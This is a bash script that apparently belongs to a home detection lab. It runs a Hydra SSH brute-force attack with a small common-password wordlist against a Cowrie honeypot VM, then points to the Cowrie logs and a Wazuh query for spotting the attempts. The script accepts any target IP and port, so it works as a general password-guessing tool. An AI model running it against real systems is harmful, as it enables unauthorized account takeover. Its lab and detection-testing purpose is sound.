#!/usr/bin/env bash
# SSH brute force scenario against the Cowrie honeypot.
#
# Target: honeypot VM (192.168.56.20), Cowrie SSH listener on port 2222
# MITRE ATT&CK: T1110 - Brute Force
#
# Usage:
#   ./brute_force.sh [target_ip] [target_port]
#   Defaults to the honeypot VM's Cowrie listener if no args given.

set -e

TARGET_IP="${1:-192.168.56.20}"
TARGET_PORT="${2:-2222}"
WORDLIST="/tmp/brute_force_wordlist.txt"

echo "==> SSH brute force scenario"
echo "    Target: ${TARGET_IP}:${TARGET_PORT}"
echo "    MITRE ATT&CK: T1110 (Brute Force)"
echo ""

# Small built-in wordlist so this runs out of the box with no extra setup.
# Swap in /usr/share/wordlists/rockyou.txt.gz (if present) for a larger run.
cat > "$WORDLIST" <<EOF
admin
password
123456
toor
root
qwerty
letmein
changeme
default
EOF

echo "==> Checking connectivity to target"
if ! nc -z -w 3 "$TARGET_IP" "$TARGET_PORT" 2>/dev/null; then
    echo "ERROR: Cannot reach ${TARGET_IP}:${TARGET_PORT}"
    echo "       Confirm the honeypot VM is up and Cowrie is running:"
    echo "         vagrant ssh honeypot"
    echo "         sudo -u cowrie -i"
    echo "         cd cowrie && source cowrie-env/bin/activate && cowrie status"
    exit 1
fi

echo "==> Running Hydra against root with common passwords"
hydra -l root -P "$WORDLIST" -s "$TARGET_PORT" "$TARGET_IP" ssh -t 4 -V

echo ""
echo "==> Scenario complete."
echo "    Check captured sessions on the honeypot VM:"
echo "      vagrant ssh honeypot"
echo "      sudo tail -20 /home/cowrie/cowrie/var/log/cowrie/cowrie.json"
echo ""
echo "    Or search the Wazuh dashboard (https://192.168.56.30/) for:"
echo "      agent.name: \"honeypot\" AND data.eventid: \"cowrie.login.success\""

rm -f "$WORDLIST"
